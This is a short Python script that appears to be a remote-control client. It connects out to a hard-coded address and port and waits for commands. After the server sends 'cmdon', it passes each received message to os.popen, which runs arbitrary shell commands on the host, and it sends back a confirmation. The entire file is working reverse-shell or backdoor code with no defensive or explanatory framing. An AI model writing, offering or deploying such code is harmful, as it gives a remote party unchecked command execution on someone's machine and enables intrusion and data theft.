import socket
import threading
import os
import sys

#HOST = '192.168.1.167'
HOST = '192.168.1.139'
PORT = 9090

cmd_mode = False
show_messages = False

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    server_message = s.recv(1024).decode('utf-8')

    if server_message == 'exit client':
        sys.exit()

    elif server_message == 'messages-on':
        show_messages = True
    
    elif server_message == 'messages-off':
        show_messages = False

    elif server_message == 'cmdon':
        cmd_mode = True
    
    elif server_message == 'cmdoff':
        cmd_mode = False

    #####
    
    # Enter command to client
    if cmd_mode:
        os.popen(server_message)

    # Show server messages
    elif show_messages and cmd_mode == False:
        print(server_message)


    s.send(f'Message {server_message} successfully executed'.encode('utf-8'))


